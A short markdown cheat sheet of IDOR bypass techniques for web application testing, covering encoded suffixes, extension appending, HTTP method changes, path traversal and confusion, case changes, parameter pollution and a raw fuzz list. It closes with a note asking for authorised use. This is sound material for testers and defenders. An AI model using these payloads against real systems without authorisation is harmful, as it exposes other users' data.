# IDOR Bypass Techniques

Insecure Direct Object Reference (IDOR) vulnerabilities can often be bypassed using various tricks and techniques. Below is a list of common methods used to bypass IDOR protections.

---

## 🔁 Encoding Tricks

- **Add encoding characters to the end of the ID:**
  ```
  /124%20
  /124%09
  /124%0b
  /124%0c
  /124%1c
  /124%1d
  /124%1e
  /124%1f
  ```

---

## 📄 Extension Appending

- **Append `.json` or other extensions:**
  ```
  /123.json
  /user/123.xml
  ```

---

## 🔀 HTTP Method Manipulation

- **Change the HTTP method:**
  ```
  GET → POST
  GET → PATCH
  ```

---

## 🐶 Directory Traversal (DOG Walk)

- **Use path traversal:**
  ```
  https://example.com/user/../123
  https://example.com/user/x/../123
  ```

---

## 🛣️ Path Confusion & Normalization Bypasses

| Technique                  | Example                         | Description                                      |
|---------------------------|----------------------------------|--------------------------------------------------|
| Path confusion            | `/..;/admin`                     | Bypass via path confusion                       |
| Double slashes            | `//admin//`                      | Bypass normalization rules                      |

---

## 🔠 Case Manipulation

- **Change case sensitivity in paths:**
  ```
  https://example.com/User/123
  ```

---

## 🧩 Parameter Pollution

- **Duplicate parameters to override values:**
  ```
  ?user=1234&user=123
  ```

---
```
List of bypass 

After Id fuzz
.json
/.json
.txt
/.txt
.xml
/.xml
..;/
.
//
/x/..
/*
/%
/_
/.
s
*
#
;
%20
%09
%0b
%0c
%1c
%1d
%1e
%1f


Menualy bypass 
Fuzz query parameter 
Change method 
GET,POST,PUT,PATCH
Fuzz in body query parameter 
Add [] after query
```

> ⚠️ **Note:** Always conduct testing with proper authorization. Use these techniques responsibly during bug bounty, penetration testing, or with permission from the application owner.
